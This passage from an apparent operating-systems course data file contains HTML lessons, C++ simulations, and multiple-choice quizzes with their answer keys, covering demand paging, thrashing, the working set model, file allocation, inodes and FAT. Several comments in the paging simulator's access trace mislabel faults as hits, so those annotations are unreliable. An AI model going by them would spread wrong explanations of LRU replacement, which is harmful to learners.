page_fault_service_time = 8 ms = 8,000,000 ns\n//\n// If p = 1/1000 (0.001):\n// EAT = 0.999 * 200 + 0.001 * 8,000,000\n//     = 199.8 + 8,000 = 8,199.8 ns (40x slowdown!)\n//\n// To keep slowdown under 10%:\n// 220 > (1-p)*200 + p*8,000,000\n// 20 > p * 7,999,800\n// p < 0.0000025 (less than 1 fault per 400,000 accesses)</div><div class="learn-warn"><b>Warning:</b> Page faults are <b>extremely expensive</b> due to disk I/O. Even a very small page fault rate can significantly degrade performance. This is why good page replacement algorithms and sufficient RAM are critical.</div></div><div class="learn-section"><div class="learn-h">Copy-on-Write (COW)</div><p class="learn-p"><b>Copy-on-Write</b> is an optimization used with <code>fork()</code>. After forking, parent and child share the same physical pages, marked as <b>read-only</b>. When either process tries to <b>write</b> to a shared page:</p><ol class="learn-list"><li>A page fault occurs (the page is read-only).</li><li>The OS creates a <b>copy</b> of the faulted page.</li><li>The writing process\'s page table is updated to point to the new copy.</li><li>The page is marked read-write for the writing process.</li></ol><p class="learn-p">This avoids unnecessary copying when the child immediately calls <code>exec()</code> (replacing the entire address space).</p></div><div class="learn-section"><div class="learn-h">Memory-Mapped Files</div><p class="learn-p"><b>Memory-mapped I/O</b> maps a file on disk into the process\'s virtual address space. Reading/writing the mapped region translates to reading/writing the file. Benefits:</p><ul class="learn-list"><li>Simplifies file I/O (use pointers instead of read/write calls).</li><li>Leverages the paging system for efficient caching.</li><li>Enables shared memory between processes (both map the same file).</li></ul><div class="learn-code">// mmap() in Unix:\nvoid *addr = mmap(NULL, length, PROT_READ | PROT_WRITE,\n                  MAP_SHARED, fd, 0);\n// Now access file contents via addr pointer\n// Changes are automatically written back to the file</div></div><div class="learn-section"><div class="learn-h">Pre-paging</div><p class="learn-p"><b>Pre-paging</b> loads several pages at once when a page fault occurs, anticipating that nearby pages will be needed soon (exploiting <b>spatial locality</b>). This can reduce the total number of page faults but may waste I/O bandwidth if the loaded pages are not actually used.</p><div class="learn-tip"><b>Tip:</b> Demand paging with good locality of reference is highly efficient. Most programs exhibit strong temporal and spatial locality, making demand paging practical.</div></div>',
          code: `// Virtual Memory / Demand Paging Simulation in C++
#include <iostream>
#include <vector>
#include <unordered_map>
#include <unordered_set>
#include <list>
#include <cstdlib>
using namespace std;

class VirtualMemorySimulator {
    int numFrames;       // Physical frames available
    int pageSize;        // Bytes per page
    int totalVirtualPages;

    struct Frame {
        int pageNum;
        bool dirty;
        bool valid;
    };

    vector<Frame> physicalMemory;
    list<int> lruOrder;  // For LRU replacement
    unordered_map<int, list<int>::iterator> pageToIter;
    unordered_map<int, int> pageToFrame; // page -> frame mapping

    int pageFaults;
    int pageHits;
    int diskWrites;      // Dirty page writebacks

public:
    VirtualMemorySimulator(int frames, int pgSize, int virtualPages)
        : numFrames(frames), pageSize(pgSize),
          totalVirtualPages(virtualPages),
          pageFaults(0), pageHits(0), diskWrites(0)
    {
        physicalMemory.resize(frames, {-1, false, false});
    }

    // Find a free frame, or evict using LRU
    int getFrame(int newPage) {
        // Check for free frame
        for (int i = 0; i < numFrames; i++) {
            if (!physicalMemory[i].valid) return i;
        }

        // LRU eviction
        int victimPage = lruOrder.back();
        lruOrder.pop_back();
        pageToIter.erase(victimPage);

        int frame = pageToFrame[victimPage];
        if (physicalMemory[frame].dirty) {
            cout << "    Writeback: page " << victimPage
                 << " (dirty) to disk" << endl;
            diskWrites++;
        }
        cout << "    Evict: page " << victimPage << " from frame "
             << frame << endl;
        pageToFrame.erase(victimPage);
        return frame;
    }

    // Access a virtual address
    void accessAddress(int virtualAddr, bool isWrite) {
        int pageNum = virtualAddr / pageSize;
        int offset = virtualAddr % pageSize;

        cout << (isWrite ? "Write" : "Read") << " addr " << virtualAddr
             << " (page=" << pageNum << ", offset=" << offset << "): ";

        if (pageToFrame.find(pageNum) != pageToFrame.end()) {
            // Page hit
            pageHits++;
            cout << "HIT (frame " << pageToFrame[pageNum] << ")" << endl;

            // Update LRU order
            lruOrder.erase(pageToIter[pageNum]);
            lruOrder.push_front(pageNum);
            pageToIter[pageNum] = lruOrder.begin();

            if (isWrite) {
                physicalMemory[pageToFrame[pageNum]].dirty = true;
            }
        } else {
            // Page fault!
            pageFaults++;
            cout << "PAGE FAULT!" << endl;

            int frame = getFrame(pageNum);
            cout << "    Load: page " << pageNum << " into frame "
                 << frame << endl;

            physicalMemory[frame] = {pageNum, isWrite, true};
            pageToFrame[pageNum] = frame;
            lruOrder.push_front(pageNum);
            pageToIter[pageNum] = lruOrder.begin();
        }
    }

    void printStats() {
        int total = pageHits + pageFaults;
        cout << "\\n=== Statistics ===" << endl;
        cout << "Total accesses: " << total << endl;
        cout << "Page hits:   " << pageHits << " ("
             << (total > 0 ? pageHits * 100.0 / total : 0) << "%)" << endl;
        cout << "Page faults: " << pageFaults << " ("
             << (total > 0 ? pageFaults * 100.0 / total : 0) << "%)" << endl;
        cout << "Disk writes: " << diskWrites << endl;

        // EAT calculation
        double memTime = 100;   // ns
        double faultTime = 8e6; // ns (8ms for disk I/O)
        double p = (total > 0) ? (double)pageFaults / total : 0;
        double eat = (1 - p) * memTime + p * faultTime;
        cout << "Effective Access Time: " << eat << " ns" << endl;
    }
};

int main() {
    cout << "=== Virtual Memory Demand Paging Simulator ===" << endl;
    // 4 physical frames, 1024-byte pages, 16 virtual pages
    VirtualMemorySimulator vm(4, 1024, 16);

    // Simulate a reference pattern with locality
    vm.accessAddress(0, false);      // Page 0 read
    vm.accessAddress(1024, false);   // Page 1 read
    vm.accessAddress(2048, true);    // Page 2 write
    vm.accessAddress(3072, false);   // Page 3 read
    vm.accessAddress(100, false);    // Page 0 hit
    vm.accessAddress(4096, false);   // Page 4 fault (evict LRU)
    vm.accessAddress(1100, false);   // Page 1 hit
    vm.accessAddress(2100, false);   // Page 2 hit (dirty)
    vm.accessAddress(5120, true);    // Page 5 fault
    vm.accessAddress(3200, false);   // Page 3 fault (was evicted)
    vm.accessAddress(50, false);     // Page 0 fault
    vm.accessAddress(1200, false);   // Page 1 hit

    vm.printStats();
    return 0;
}`,
          problems: [
            ['Virtual Memory in OS', 'https://www.geeksforgeeks.org/virtual-memory-in-operating-system/', 'Easy'],
            ['Demand Paging', 'https://www.geeksforgeeks.org/virtual-memory-in-operating-system/', 'Medium'],
            ['Page Fault Handling', 'https://www.geeksforgeeks.org/page-fault-handling-in-operating-system/', 'Medium'],
          ],
          mcqs: [
            {q: 'What is the main advantage of demand paging over loading all pages at startup?', o: ['Faster disk access', 'Lower memory usage since only needed pages are loaded', 'Simpler implementation', 'No page faults occur'], a: 1},
            {q: 'In Copy-on-Write, when is a physical copy of a shared page actually created?', o: ['Immediately after fork()', 'When either process writes to the page', 'When the child process starts executing', 'When the parent process terminates'], a: 1},
            {q: 'If the page fault rate is 0.001 and page fault service time is 10ms, what is the approximate EAT (memory access = 200ns)?', o: ['200 ns', '10,200 ns', '1,020 ns', '100,200 ns'], a: 1},
          ],
        },
        // ----- Topic 1: Thrashing & Working Set Model -----
        {
          t: 'Thrashing & Working Set Model',
          learn: '<div class="learn-section"><div class="learn-h">What is Thrashing?</div><p class="learn-p"><b>Thrashing</b> occurs when a system spends more time <b>swapping pages in and out</b> of memory than executing useful work. It is a catastrophic performance degradation caused by insufficient physical memory for the working sets of active processes.</p><p class="learn-p"><b>How thrashing develops:</b></p><ol class="learn-list"><li>The OS tries to increase the <b>degree of multiprogramming</b> (number of processes in memory) to improve CPU utilization.</li><li>More processes = less frames per process.</li><li>Processes start experiencing more <b>page faults</b>.</li><li>Processes spend more time waiting for I/O (page swaps), so CPU utilization <b>drops</b>.</li><li>The OS responds by loading <b>even more processes</b>, making it worse.</li><li>System enters a <b>death spiral</b>: CPU utilization collapses, I/O devices are saturated with page swaps.</li></ol><div class="learn-warn"><b>Warning:</b> Thrashing is one of the most common causes of system performance degradation. It can bring even powerful servers to their knees if not properly managed.</div></div><div class="learn-section"><div class="learn-h">Causes of Thrashing</div><p class="learn-p">The fundamental cause is that the sum of all processes\' <b>working sets</b> exceeds the available physical memory:</p><ul class="learn-list"><li>&Sigma; Working Set Size(i) &gt; Total Physical Frames</li></ul><p class="learn-p">Contributing factors:</p><ul class="learn-list"><li>Too many processes competing for limited memory.</li><li>Insufficient RAM for the workload.</li><li>Poor page replacement algorithm (e.g., replacing pages that will be needed soon).</li><li>Poor locality of reference in programs (e.g., random access patterns over large data).</li></ul></div><div class="learn-section"><div class="learn-h">Locality of Reference</div><p class="learn-p">Most programs exhibit <b>locality of reference</b>, which is what makes virtual memory practical:</p><table class="learn-table"><tr><th>Type</th><th>Description</th><th>Example</th></tr><tr><td>Temporal Locality</td><td>Recently accessed data is likely to be accessed again soon</td><td>Loop variables, frequently called functions</td></tr><tr><td>Spatial Locality</td><td>Data near recently accessed data is likely to be accessed soon</td><td>Array traversals, sequential code execution</td></tr></table><p class="learn-p">A process transitions between <b>locality sets</b>. Each locality is a set of pages that are actively used together (e.g., pages of a function and its data). When a process moves to a new locality, page faults spike temporarily but settle down once the new pages are loaded.</p></div><div class="learn-section"><div class="learn-h">Working Set Model</div><p class="learn-p">The <b>Working Set</b> of a process is the set of pages it has referenced during the last <b>&Delta;</b> (delta) time units (the <b>working set window</b>).</p><div class="learn-code">// Working Set at time t with window delta:\n// WS(t, &Delta;) = { pages referenced in the interval (t - &Delta;, t) }\n//\n// Example: Reference string = ...2, 6, 1, 5, 7, 7, 7, 7, 5, 1...\n// At the end, with &Delta; = 10:\n// WS = {1, 2, 5, 6, 7} (5 distinct pages)\n// Working Set Size (WSS) = 5</div><p class="learn-p"><b>Key insight:</b> If each process is allocated at least as many frames as its working set size (WSS<sub>i</sub>), thrashing is prevented.</p><p class="learn-p">Total demand: <b>D = &Sigma; WSS<sub>i</sub></b>. If D &gt; total frames, thrashing will occur. In this case, <b>suspend one or more processes</b> to free memory.</p><div class="learn-tip"><b>Tip:</b> Choosing &Delta; is critical. Too small &rarr; doesn\'t capture the full locality. Too large &rarr; includes pages from old localities. Typical approach: use the page fault frequency to adaptively adjust.</div></div><div class="learn-section"><div class="learn-h">Page Fault Frequency (PFF) Strategy</div><p class="learn-p">An alternative to the working set model: directly control the <b>page fault frequency</b> of each process.</p><ul class="learn-list"><li>If a process\'s page fault rate is <b>too high</b> (above upper threshold): allocate more frames to it.</li><li>If a process\'s page fault rate is <b>too low</b> (below lower threshold): take frames away (it has more than it needs).</li><li>If total demand exceeds supply: <b>suspend a process</b>.</li></ul><p class="learn-p">PFF provides a more <b>direct</b> way to manage memory allocation than the working set model.</p></div><div class="learn-section"><div class="learn-h">Preventing Thrashing</div><p class="learn-p">Strategies to prevent or mitigate thrashing:</p><ol class="learn-list"><li><b>Working Set / PFF:</b> Allocate sufficient frames based on actual usage patterns.</li><li><b>Load control:</b> Limit the degree of multiprogramming. Use a medium-term scheduler to swap out processes when memory is low.</li><li><b>Add physical memory:</b> The most straightforward hardware solution.</li><li><b>Better locality programs:</b> Programmers should write code with good locality (e.g., access arrays row-by-row in row-major languages like C).</li><li><b>Proportional allocation:</b> Allocate frames proportional to process size or priority.</li></ol></div><div class="learn-section"><div class="learn-h">Frame Allocation Strategies</div><table class="learn-table"><tr><th>Strategy</th><th>Description</th></tr><tr><td>Equal Allocation</td><td>Divide frames equally among all processes. Simple but ignores different needs.</td></tr><tr><td>Proportional Allocation</td><td>Allocate frames proportional to process size: a<sub>i</sub> = (s<sub>i</sub> / &Sigma;s) * m frames.</td></tr><tr><td>Priority Allocation</td><td>Allocate based on priority rather than size.</td></tr><tr><td>Global Replacement</td><td>A process can replace any frame (even from another process). More throughput but less predictable.</td></tr><tr><td>Local Replacement</td><td>A process can only replace its own frames. More predictable but may underutilize memory.</td></tr></table><div class="learn-warn"><b>Warning:</b> <b>Global replacement</b> can cause thrashing more easily because one process can steal frames from another, causing the victim to page fault more. However, it generally achieves better throughput and is used by most real systems.</div></div>',
          code: `// Working Set and Thrashing Simulation in C++
#include <iostream>
#include <vector>
#include <unordered_set>
#include <deque>
#include <cmath>
using namespace std;

// Calculate Working Set Size at each point in the reference string
void workingSetDemo(vector<int>& refs, int delta) {
    cout << "=== Working Set Analysis (delta=" << delta << ") ===" << endl;
    cout << "Time\\tPage\\tWorking Set\\t\\tWSS" << endl;

    for (int t = 0; t < (int)refs.size(); t++) {
        unordered_set<int> ws;
        int start = max(0, t - delta + 1);
        for (int i = start; i <= t; i++) {
            ws.insert(refs[i]);
        }
        cout << t << "\\t" << refs[t] << "\\t{";
        bool first = true;
        for (int p : ws) {
            if (!first) cout << ",";
            cout << p;
            first = false;
        }
        cout << "}\\t\\t\\t" << ws.size() << endl;
    }
}

// Simulate thrashing: show page fault rate vs degree of multiprogramming
void thrashingSimulation() {
    cout << "\\n=== Thrashing Simulation ===" << endl;
    cout << "Processes\\tFrames/Proc\\tFault Rate\\tCPU Util" << endl;

    int totalFrames = 100;

    for (int numProcs = 1; numProcs <= 20; numProcs++) {
        int framesPerProc = totalFrames / numProcs;
        int wssNeeded = 10; // Each process needs ~10 frames

        // Model: if frames < WSS, fault rate increases dramatically
        double faultRate;
        if (framesPerProc >= wssNeeded) {
            faultRate = 0.001 * wssNeeded / framesPerProc;
        } else {
            // Severe fault rate when frames < working set size
            faultRate = 0.5 * (1.0 - (double)framesPerProc / wssNeeded);
        }
        faultRate = min(faultRate, 0.9);

        // CPU utilization model
        // When processes are doing I/O (page faults), CPU is idle
        double cpuUtil = numProcs * (1.0 - faultRate);
        cpuUtil = min(cpuUtil, 1.0); // Cap at 100%

        // But if thrashing, CPU util drops dramatically
        if (faultRate > 0.1) {
            cpuUtil = cpuUtil * (1.0 - faultRate);
        }

        cout << numProcs << "\\t\\t" << framesPerProc << "\\t\\t"
             << (int)(faultRate * 100) << "%\\t\\t"
             << (int)(cpuUtil * 100) << "%" << endl;
    }
}

// Page Fault Frequency (PFF) based allocation
class PFFAllocator {
    double upperThreshold;
    double lowerThreshold;
    int totalFrames;
    int numProcesses;
    vector<int> allocatedFrames;
    vector<double> faultRates;

public:
    PFFAllocator(int frames, int procs, double upper, double lower)
        : totalFrames(frames), numProcesses(procs),
          upperThreshold(upper), lowerThreshold(lower)
    {
        // Start with equal allocation
        allocatedFrames.resize(procs, frames / procs);
        faultRates.resize(procs, 0.05); // Initial fault rates
    }

    void adjust() {
        cout << "\\n=== PFF Frame Allocation ===" << endl;
        cout << "Proc\\tFrames\\tFault Rate\\tAction" << endl;

        for (int i = 0; i < numProcesses; i++) {
            string action = "OK";
            if (faultRates[i] > upperThreshold) {
                // Need more frames
                int extra = min(5, totalFrames - usedFrames());
                if (extra > 0) {
                    allocatedFrames[i] += extra;
                    action = "Add " + to_string(extra) + " frames";
                } else {
                    action = "SUSPEND (no free frames)";
                }
            } else if (faultRates[i] < lowerThreshold) {
                // Has too many frames
                int release = max(1, allocatedFrames[i] / 4);
                allocatedFrames[i] -= release;
                action = "Release " + to_string(release) + " frames";
            }

            cout << "P" << i << "\\t" << allocatedFrames[i] << "\\t"
                 << (int)(faultRates[i] * 100) << "%\\t\\t"
                 << action << endl;
        }
    }

    int usedFrames() {
        int sum = 0;
        for (int f : allocatedFrames) sum += f;
        return sum;
    }

    void setFaultRate(int proc, double rate) {
        faultRates[proc] = rate;
    }
};

int main() {
    // Working Set demo
    vector<int> refs = {1, 2, 3, 2, 1, 4, 5, 4, 3, 2, 1, 5};
    workingSetDemo(refs, 4);

    // Thrashing simulation
    thrashingSimulation();

    // PFF demo
    PFFAllocator pff(100, 5, 0.15, 0.02);
    pff.setFaultRate(0, 0.20);  // Too high
    pff.setFaultRate(1, 0.01);  // Too low
    pff.setFaultRate(2, 0.08);  // OK
    pff.setFaultRate(3, 0.25);  // Too high
    pff.setFaultRate(4, 0.05);  // OK
    pff.adjust();

    return 0;
}`,
          problems: [
            ['Thrashing in Operating System', 'https://www.geeksforgeeks.org/techniques-to-handle-thrashing/', 'Medium'],
            ['Working Set Model', 'https://www.geeksforgeeks.org/working-set-model/', 'Medium'],
            ['Page Fault Rate and EAT', 'https://www.geeksforgeeks.org/page-fault-handling-in-operating-system/', 'Easy'],
          ],
          mcqs: [
            {q: 'Thrashing occurs when:', o: ['CPU utilization is very high', 'The system spends more time paging than executing', 'All processes are in the ready state', 'The disk is full'], a: 1},
            {q: 'In the Working Set model, what happens when the total working set demand exceeds available frames?', o: ['The OS allocates more disk space', 'A process is suspended to free memory', 'All processes share frames equally', 'The page size is increased'], a: 1},
            {q: 'Which of the following best prevents thrashing?', o: ['Using FIFO page replacement', 'Increasing page size', 'Controlling the degree of multiprogramming', 'Using larger disks'], a: 2},
          ],
        },
      ],
    },

    // ===== TAB: FILE SYSTEMS =====
    {
      id: 'fs', t: 'File Systems',
      topics: [
        // ----- Topic 0: File Allocation Methods -----
        {
          t: 'File Allocation Methods',
          learn: '<div class="learn-section"><div class="learn-h">File Allocation Concepts</div><p class="learn-p">When files are stored on disk, the OS must decide how to allocate disk blocks to files. The allocation method significantly impacts performance (sequential and random access speed), storage efficiency (internal/external fragmentation), and reliability.</p></div><div class="learn-section"><div class="learn-h">1. Contiguous Allocation</div><p class="learn-p">Each file occupies a <b>contiguous set of disk blocks</b>. The directory entry stores the <b>starting block</b> and <b>length</b> (number of blocks).</p><p class="learn-p"><b>Advantages:</b></p><ul class="learn-list"><li><b>Excellent sequential access:</b> No seek needed between blocks.</li><li><b>Fast random access:</b> Block i of a file = start + i. <span class="learn-complexity">O(1)</span>.</li><li>Simple implementation.</li></ul><p class="learn-p"><b>Disadvantages:</b></p><ul class="learn-list"><li><b>External fragmentation:</b> As files are created and deleted, free space becomes fragmented.</li><li><b>File growth is difficult:</b> If the blocks after the file are occupied, the file must be relocated.</li><li>Must know the file size at creation time.</li></ul><div class="learn-tip"><b>Tip:</b> Contiguous allocation is used in CD-ROMs and DVDs where files don\'t change after creation.</div></div><div class="learn-section"><div class="learn-h">2. Linked Allocation</div><p class="learn-p">Each file is a <b>linked list of disk blocks</b>. Each block contains a pointer to the next block. The directory entry stores the <b>first block</b> and <b>last block</b> pointers.</p><p class="learn-p"><b>Advantages:</b></p><ul class="learn-list"><li><b>No external fragmentation:</b> Any free block can be used.</li><li>Files can grow dynamically.</li><li>No need to know file size at creation.</li></ul><p class="learn-p"><b>Disadvantages:</b></p><ul class="learn-list"><li><b>Slow random access:</b> To reach block i, must traverse i pointers. <span class="learn-complexity">O(n)</span>.</li><li><b>Pointer overhead:</b> Each block loses space to the pointer (e.g., 4 bytes per 512-byte block = 0.78% overhead).</li><li><b>Reliability:</b> If one pointer is corrupted, the rest of the file is lost.</li></ul><div class="learn-warn"><b>Warning:</b> <b>FAT (File Allocation Table)</b> is an improvement over simple linked allocation. Instead of storing pointers in each block, all pointers are collected into a table (the FAT) kept in memory. This enables faster random access.</div></div><div class="learn-section"><div class="learn-h">3. Indexed Allocation</div><p class="learn-p">Each file has an <b>index block</b> (also called an <b>inode</b> in Unix). The index block contains an array of pointers to the file\'s data blocks. The directory entry points to the index block.</p><p class="learn-p"><b>Advantages:</b></p><ul class="learn-list"><li><b>Fast random access:</b> Block i = index_block[i]. <span class="learn-complexity">O(1)</span>.</li><li>No external fragmentation.</li><li>Files can grow dynamically.</li></ul><p class="learn-p"><b>Disadvantages:</b></p><ul class="learn-list"><li>Overhead of the index block (wasted if file is very small).</li><li>Index block size limits the maximum file size.</li></ul><p class="learn-p"><b>Handling large files:</b></p><ul class="learn-list"><li><b>Linked index blocks:</b> Chain multiple index blocks together.</li><li><b>Multilevel index:</b> Index block points to other index blocks (like multilevel page tables).</li><li><b>Combined scheme (Unix inode):</b> Direct pointers + single indirect + double indirect + triple indirect.</li></ul></div><div class="learn-section"><div class="learn-h">Unix Inode Structure</div><div class="learn-code">// Unix inode (simplified):\n// 12 direct block pointers  -> point directly to data blocks\n// 1 single indirect pointer -> points to a block of pointers\n// 1 double indirect pointer -> points to a block of single indirect blocks\n// 1 triple indirect pointer -> points to a block of double indirect blocks\n//\n// With 4KB blocks and 4-byte pointers (1024 pointers per block):\n// Direct:         12 * 4KB = 48 KB\n// Single indirect: 1024 * 4KB = 4 MB\n// Double indirect: 1024 * 1024 * 4KB = 4 GB\n// Triple indirect: 1024^3 * 4KB = 4 TB\n// Max file size   ~= 4 TB</div></div><div class="learn-section"><div class="learn-h">Comparison of Allocation Methods</div><table class="learn-table"><tr><th>Feature</th><th>Contiguous</th><th>Linked</th><th>Indexed</th></tr><tr><td>Sequential Access</td><td>Excellent</td><td>Good</td><td>Good</td></tr><tr><td>Random Access</td><td><span class="learn-complexity">O(1)</span></td><td><span class="learn-complexity">O(n)</span></td><td><span class="learn-complexity">O(1)</span></td></tr><tr><td>External Fragmentation</td><td>Yes</td><td>No</td><td>No</td></tr><tr><td>File Growth</td><td>Difficult</td><td>Easy</td><td>Easy</td></tr><tr><td>Space Overhead</td><td>None</td><td>Pointer per block</td><td>Index block</td></tr><tr><td>Used In</td><td>CD/DVD</td><td>FAT</td><td>Unix/Linux (ext4)</td></tr></table></div>',
          code: `// File Allocation Methods Simulation in C++
#include <iostream>
#include <vector>
#include <unordered_map>
#include <list>
using namespace std;

const int DISK_SIZE = 50; // 50 blocks on disk
bool diskBlocks[DISK_SIZE]; // true = allocated

// ===== CONTIGUOUS ALLOCATION =====
struct ContiguousFile {
    string name;
    int start, length;
};

class ContiguousAlloc {
    vector<ContiguousFile> files;
public:
    ContiguousAlloc() { fill(diskBlocks, diskBlocks + DISK_SIZE, false); }

    bool allocate(string name, int length) {
        // First-fit: find first contiguous hole of size >= length
        int count = 0, start = -1;
        for (int i = 0; i < DISK_SIZE; i++) {
            if (!diskBlocks[i]) {
                if (count == 0) start = i;
                count++;
                if (count == length) {
                    for (int j = start; j < start + length; j++)
                        diskBlocks[j] = true;
                    files.push_back({name, start, length});
                    cout << "Contiguous: " << name << " at blocks "
                         << start << "-" << start + length - 1 << endl;
                    return true;
                }
            } else {
                count = 0;
            }
        }
        cout << "Contiguous: No space for " << name << endl;
        return false;
    }

    // Random access: O(1)
    int accessBlock(string name, int blockIndex) {
        for (auto& f : files) {
            if (f.name == name) {
                if (blockIndex < f.length)
                    return f.start + blockIndex;
                return -1;
            }
        }
        return -1;
    }
};

// ===== LINKED ALLOCATION =====
struct LinkedBlock {
    int next; // -1 = end of file
};

class LinkedAlloc {
    LinkedBlock blocks[DISK_SIZE];
    unordered_map<string, pair<int,int>> files; // name -> (first, last)
    bool used[DISK_SIZE];

public:
    LinkedAlloc() {
        fill(used, used + DISK_SIZE, false);
        for (int i = 0; i < DISK_SIZE; i++) blocks[i].next = -1;
    }

    int findFreeBlock() {
        for (int i = 0; i < DISK_SIZE; i++)
            if (!used[i]) return i;
        return -1;
    }

    bool allocate(string name, int numBlocks) {
        int first = -1, prev = -1;
        cout << "Linked: " << name << " blocks: ";
        for (int i = 0; i < numBlocks; i++) {
            int blk = findFreeBlock();
            if (blk == -1) return false;
            used[blk] = true;
            cout << blk << " ";
            if (first == -1) first = blk;
            if (prev != -1) blocks[prev].next = blk;
            prev = blk;
        }
        blocks[prev].next = -1;
        files[name] = {first, prev};
        cout << endl;
        return true;
    }

    // Random access: O(n) - must traverse the chain
    int accessBlock(string name, int blockIndex) {
        if (files.find(name) == files.end()) return -1;
        int blk = files[name].first;
        for (int i = 0; i < blockIndex && blk != -1; i++)
            blk = blocks[blk].next;
        return blk;
    }
};

// ===== INDEXED ALLOCATION =====
class IndexedAlloc {
    bool used[DISK_SIZE];
    unordered_map<string, int> fileIndex; // name -> index block
    vector<int> indexBlocks[DISK_SIZE];    // index block -> data blocks

public:
    IndexedAlloc() { fill(used, used + DISK_SIZE, false); }

    int findFreeBlock() {
        for (int i = 0; i < DISK_SIZE; i++)
            if (!used[i]) return i;
        return -1;
    }

    bool allocate(string name, int numBlocks) {
        int idxBlock = findFreeBlock();
        if (idxBlock == -1) return false;
        used[idxBlock] = true;

        cout << "Indexed: " << name << " index=" << idxBlock
             << " data=";
        for (int i = 0; i < numBlocks; i++) {
            int blk = findFreeBlock();
            if (blk == -1) return false;
            used[blk] = true;
            indexBlocks[idxBlock].push_back(blk);
            cout << blk << " ";
        }
        fileIndex[name] = idxBlock;
        cout << endl;
        return true;
    }

    // Random access: O(1)
    int accessBlock(string name, int blockIndex) {
        if (fileIndex.find(name) == fileIndex.end()) return -1;
        int idx = fileIndex[name];
        if (blockIndex < (int)indexBlocks[idx].size())
            return indexBlocks[idx][blockIndex];
        return -1;
    }
};

int main() {
    cout << "=== Contiguous Allocation ===" << endl;
    ContiguousAlloc ca;
    ca.allocate("file1.txt", 5);
    ca.allocate("file2.txt", 3);
    cout << "file1.txt block[2] = disk block " << ca.accessBlock("file1.txt", 2) << endl;

    cout << "\\n=== Linked Allocation ===" << endl;
    LinkedAlloc la;
    la.allocate("data.csv", 4);
    la.allocate("log.txt", 3);
    cout << "data.csv block[2] = disk block " << la.accessBlock("data.csv", 2) << endl;

    cout << "\\n=== Indexed Allocation ===" << endl;
    IndexedAlloc ia;
    ia.allocate("report.pdf", 5);
    ia.allocate("image.png", 3);
    cout << "report.pdf block[3] = disk block " << ia.accessBlock("report.pdf", 3) << endl;

    return 0;
}`,
          problems: [
            ['File Allocation Methods', 'https://www.geeksforgeeks.org/file-allocation-methods/', 'Easy'],
            ['Indexed File Allocation', 'https://www.geeksforgeeks.org/file-allocation-methods/', 'Medium'],
            ['FAT File System', 'https://www.geeksforgeeks.org/file-allocation-table-fat/', 'Medium'],
          ],
          mcqs: [
            {q: 'Which file allocation method provides O(1) random access without external fragmentation?', o: ['Contiguous', 'Linked', 'Indexed', 'Both Contiguous and Indexed'], a: 2},
            {q: 'What is the main disadvantage of contiguous allocation?', o: ['Slow sequential access', 'External fragmentation and difficulty growing files', 'High pointer overhead', 'Requires index blocks'], a: 1},
            {q: 'In a Unix inode with 12 direct pointers and 4KB blocks, what is the maximum file size using only direct pointers?', o: ['12 KB', '48 KB', '4 MB', '4 GB'], a: 1},
          ],
        },
        // ----- Topic 1: inode, FAT & Directory Structures -----
        {
          t: 'inode, FAT & Directory Structures',
          learn: '<div class="learn-section"><div class="learn-h">Unix Inode (Index Node)</div><p class="learn-p">The <b>inode</b> is the fundamental data structure in Unix/Linux file systems (ext2, ext3, ext4). Every file and directory has exactly one inode that stores all metadata <b>except the file name</b>.</p><p class="learn-p"><b>Inode contents:</b></p><table class="learn-table"><tr><th>Field</th><th>Description</th></tr><tr><td>File type</td><td>Regular file, directory, symbolic link, etc.</td></tr><tr><td>Permissions</td><td>rwxrwxrwx (owner, group, others)</td></tr><tr><td>Owner (UID)</td><td>User ID of the file owner</td></tr><tr><td>Group (GID)</td><td>Group ID</td></tr><tr><td>File size</td><td>Size in bytes</td></tr><tr><td>Timestamps</td><td>Access time, modification time, change time</td></tr><tr><td>Link count</td><td>Number of hard links pointing to this inode</td></tr><tr><td>Block pointers</td><td>12 direct + 1 single indirect + 1 double indirect + 1 triple indirect</td></tr></table><div class="learn-tip"><b>Tip:</b> The file name is NOT stored in the inode. It is stored in the <b>directory entry</b> along with the inode number. This is why hard links work: multiple directory entries can point to the same inode.</div></div><div class="learn-section"><div class="learn-h">Hard Links vs. Symbolic Links</div><table class="learn-table"><tr><th>Feature</th><th>Hard Link</th><th>Symbolic (Soft) Link</th></tr><tr><td>What it stores</td><td>Same inode number</td><td>Path to the target file</td></tr><tr><td>Cross filesystem?</td><td>No</td><td>Yes</td></tr><tr><td>Link to directory?</td><td>No (usually)</td><td>Yes</td></tr><tr><td>Target deleted?</td><td>File persists until last hard link removed</td><td>Becomes a dangling link</td></tr><tr><td>Inode count</td><td>Increments link count</td><td>Has its own inode</td></tr></table><div class="learn-code">// ln file1.txt hardlink.txt    -> hard link (same inode)\n// ln -s file1.txt symlink.txt  -> symbolic link (different inode)\n// ls -i file1.txt hardlink.txt -> shows same inode number</div></div><div class="learn-section"><div class="learn-h">FAT (File Allocation Table)</div><p class="learn-p"><b>FAT</b> is a simple file system used in MS-DOS, USB drives, and SD cards. Variants: FAT12, FAT16, FAT32, exFAT.</p><p class="learn-p">The <b>File Allocation Table</b> is a table with one entry per disk block. Each entry contains either:</p><ul class="learn-list"><li>The <b>next block number</b> in the chain (linked allocation)</li><li><b>0</b> (free block)</li><li><b>EOF marker</b> (end of file)</li><li><b>Bad block marker</b></li></ul><div class="learn-code">// FAT Example:\n// Block:  0   1   2   3   4   5   6   7\n// FAT:  [EOF  3   0   5   0  EOF  0   0]\n//\n// File A starts at block 0: 0 -> EOF (1 block)\n// File B starts at block 1: 1 -> 3 -> 5 -> EOF (3 blocks)</div><p class="learn-p"><b>Advantages:</b> Simple, widely supported, good for removable media. <b>Disadvantages:</b> No permissions/security, FAT table must be in memory for fast access (can be large), no journaling (prone to corruption on crash).</p></div><div class="learn-section"><div class="learn-h">Directory Structures</div><p class="learn-p">A <b>directory</b> is a special file that contains a list of (name, inode/block) pairs. Common directory structures:</p><p class="learn-p"><b>1. Single-Level Directory:</b> All files in one directory. Simple but name collisions are problematic with multiple users.</p><p class="learn-p"><b>2. Two-Level Directory:</b> Each user has their own directory. Isolates users but no logical grouping within a user\'s files.</p><p class="learn-p"><b>3. Tree-Structured Directory:</b> Hierarchical directory tree (what we use today). Users can create subdirectories. Files are identified by their <b>absolute path</b> (from root) or <b>relative path</b> (from current directory).</p><p class="learn-p"><b>4. Acyclic-Graph Directory:</b> Allows shared subdirectories and files (via hard links or symbolic links). Must handle deletion carefully (reference counting for hard links).</p><p class="learn-p"><b>5. General Graph Directory:</b> Allows cycles. Problematic because file system traversals (e.g., backup) may loop forever. Garbage collection needed to reclaim unreferenced files.</p><div class="learn-warn"><b>Warning:</b> Unix prevents hard links to directories (except for <code>.</code> and <code>..</code>) specifically to avoid cycles in the directory graph. Symbolic 